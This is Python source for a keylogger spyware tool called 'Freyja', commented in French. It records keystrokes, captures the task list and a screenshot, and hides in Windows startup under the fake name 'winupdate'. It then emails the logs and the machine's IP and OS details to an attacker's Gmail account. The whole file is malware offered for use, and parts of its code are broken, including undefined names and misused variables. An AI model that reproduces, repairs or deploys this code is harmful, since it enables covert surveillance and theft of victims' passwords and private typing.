# Freyja v1.1.2.3

from pynput.keyboard import Key, Listener
import logging, smtplib, os, socket, datetime, sys, subprocess, time, simplejson, re, platform, shutil, pyscreeze
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from subprocess import Popen, PIPE, check_output

# Données à modifier
configuser = "L'email pour envoyer"
configsend = "L'email de réception des données"
configpassword = "Votre MDP"

# Ajout du logiciel au startup de windows.
def startup():
        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
        copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)

# Envois les données à une email.
def emailing():
    email_user = configuser
    email_send = configsend
    email_password = configpassword
    subject = 'Keylogger', myip

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject, osver

    body = 'Python Keylogger réponse.'
    msg.attach(MIMEText(body, 'plain'))

    filename='key_log.txt', 'output.txt', 's.png'
    attachment =open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)

    server.sendmail(email_user,email_send,text)
    server.quit()

# Fonction du Keylogger, log : key_log.txt
def Keylogger():

    log_dir = ""

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='"%(asctime)s", %(message)s')

    def on_press(key):
        logging.info('"{0}"'.format(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le bordel s'arrête quand on appuie sur Echap.
    #def on_press(key):
    #    logging.info(str(key))
    #    if key == Key.esc:
    #        return False

# Enregistre la tasklist au moment du lancement du logiciel
def tasklist():
    tasklist = os.system("tasklist")
    with open("output.txt", "wb") as f:
        f.write(subprocess.check_output(['tasklist']))
        f.close()

# Fait un screenshot de l'écran au moment du lancement du logiciel.
def screenshot():
    screen = pyscreeze.screenshot("s.png")

def Main():
    tasklist()
    Keylogger()
    #startup()
    time.sleep(3)
    screenshot()

    # Prend l'ip
    hostname = socket.gethostname()
    myip = socket.gethostbyname(hostname)

    # Obtient la plateforme sur laquelle le logiciel est lancé.
    osver = platform.platform()

    time.sleep(3600)
    emailing()

# Fin du spyware

# Lance le programme si lancé depuis le exe de base.
if __name__ == '__main__':
    Main()
